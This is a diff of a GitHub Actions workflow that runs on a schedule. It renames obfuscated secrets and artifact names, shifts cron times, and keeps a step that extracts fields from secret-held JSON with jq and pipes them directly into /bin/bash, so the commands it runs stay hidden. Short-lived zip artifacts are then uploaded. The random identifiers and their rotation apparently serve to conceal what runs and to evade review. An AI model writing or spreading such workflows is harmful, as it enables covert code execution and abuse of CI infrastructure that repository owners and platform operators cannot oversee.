@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '18 4,10,16,22 * * *'
+    - cron: '49 1,7,13,19 * * *'
 permissions:
   contents: read
   actions: read
@@ -17,18 +17,17 @@ jobs:
         uses: actions/checkout@v4
       - name: Invoke
         env:
-          y6557: ${{ secrets.y6557 }}
+          chvp4874: ${{ secrets.chvp4874 }}
         run: |
-          printf '%s' "$y6557" | jq -r .ppp601 | /bin/bash
-          printf '%s' "$gxbw5" | jq -r .u28 | /bin/bash
-          echo $m61749 | jq -r .gp71 | /bin/bash
-          printf '%s' "$l990" | jq -r .bbpq898 | /bin/bash
-          echo $ni792 | jq -r .oc269 | /bin/bash
+          printf '%s' "$chvp4874" | jq -r .bfa57395 | /bin/bash
+          printf '%s' "$h6" | jq -r .a2 | /bin/bash
+          printf '%s' "$d8" | jq -r .wjqv09 | /bin/bash
+          echo $iqdi97 | jq -r .bw625 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: pfHbH9H7
+          name: GbWbuook
           path: "*.zip"
           retention-days: 1
